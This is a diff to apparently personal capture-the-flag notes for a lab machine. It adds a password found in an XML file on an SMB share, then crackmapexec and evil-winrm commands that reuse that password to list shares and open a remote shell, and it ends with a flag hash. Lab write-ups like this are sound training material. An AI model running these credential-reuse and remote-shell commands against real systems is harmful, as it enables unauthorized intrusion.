@@ -86,7 +86,28 @@ smbclient //10.10.10.172/users$ -U 'SABatchJobs' --password 'SABatchJobs'
 ```
 ![[Pasted image 20240503180623.png]]
 
-When we open the file 
+When we open the file the XML file
+![[Pasted image 20240503181028.png]]
 ```
 4n0therD4y@n0th3r$
 ```
+
+
+```
+crackmapexec smb 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$' --shares
+```
+![[Pasted image 20240503181245.png]]
+
+```
+evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172
+```
+
+So finally we got the shell
+![[Pasted image 20240503181643.png]]
+
+
+```
+d2101a768fb7f09c6b6fb7d728f911fa
+```
+![[Pasted image 20240503181747.png]]
+
